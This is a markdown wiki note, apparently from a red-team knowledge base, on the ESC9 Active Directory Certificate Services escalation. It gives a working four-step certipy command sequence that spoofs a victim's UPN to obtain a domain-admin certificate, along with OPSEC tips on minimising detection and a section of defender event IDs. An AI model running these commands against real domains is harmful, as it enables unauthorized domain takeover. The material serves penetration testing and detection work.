---
title: "ESC9 — template omits the security extension (no SID binding)"
type: concept
created: 2026-09-07
updated: 2026-09-07
tags: [active-directory, ad-cs, esc, privilege-escalation, pkinit]
---

# ESC9

**No security extension.** A template with
**`CT_FLAG_NO_SECURITY_EXTENSION`** omits
`szOID_NTDS_CA_SECURITY_EXT` from issued certs — so the cert carries **no
SID binding** to the enrolling account. That alone isn't a logon; combined
with **weak certificate mapping** ([[esc10]] / [[certificate-mapping]]), the
DC maps the cert by **UPN/SAN instead of SID**, which is what lets the
classic **UPN-swap** identity-spoof work.

## The condition (both must hold)

1. Template sets `CT_FLAG_NO_SECURITY_EXTENSION` (no SID in the cert).
2. DC `StrongCertificateBindingEnforcement` `< 2` (compatibility/disabled) —
   the cert may map by a weak attribute.

Post-KB5014754, most *new* templates embed the SID, so ESC9 is a
**legacy-template** finding — still common in domains that didn't re-issue.

## Exploit

```bash
# 1. need GenericWrite on the victim account (via [[acl-abuse]]); swap their UPN
certipy account update -u user@corp.local -p 'Pass' -user victim -upn administrator@corp.local

# 2. enroll as victim using the ESC9 template (no SID embedded)
certipy req -u victim@corp.local -p 'victimpass' -ca CORP-CA -template ESC9Template

# 3. restore the victim's UPN (cleanup — don't break their logon)
certipy account update -u user@corp.local -p 'Pass' -user victim -upn victim@corp.local

# 4. auth with the cert — weak mapping resolves by the (now DA) UPN
certipy auth -pfx victim.pfx -dc-ip <DC_IP>
```

`certipy find` flags ESC9 templates (it checks the flag **and** the
enforcement level).

## Red-team notes (OPSEC)

- **Check enforcement first** — at `StrongCertificateBindingEnforcement = 2`
  the UPN-swap is dead on arrival; don't burn the GenericWrite you found.
- **The UPN swap is your loudest move** — 5136 on the user object; do it,
  enroll, and revert in one tight window.
- The cert stays valid after the revert — it's a persistence artifact
  (and a detection artifact): a cert for an account that no longer has that
  UPN.

## Detection

- **5136** on a user's `userPrincipalName` followed by **4886/4887** for a
  cert whose subject matches the *new* UPN.
- **4768** cert-preauth for an account whose cert's SID extension is absent
  (or mismatches the account SID).
- CA log: enrollment via a template missing the security extension.

## Links

- [[ad-cs-esc-attacks]] — ESC9 in the family
- [[esc16]] — the **CA-wide** version (security extension disabled globally, not per-template)
- [[esc10]] — the weak-mapping half of the pair
- [[certificate-mapping]] — the mapping/enforcement mechanics
- [[certificate-templates]] — where the flag lives
- [[certipy]], [[certified-pre-owned]]
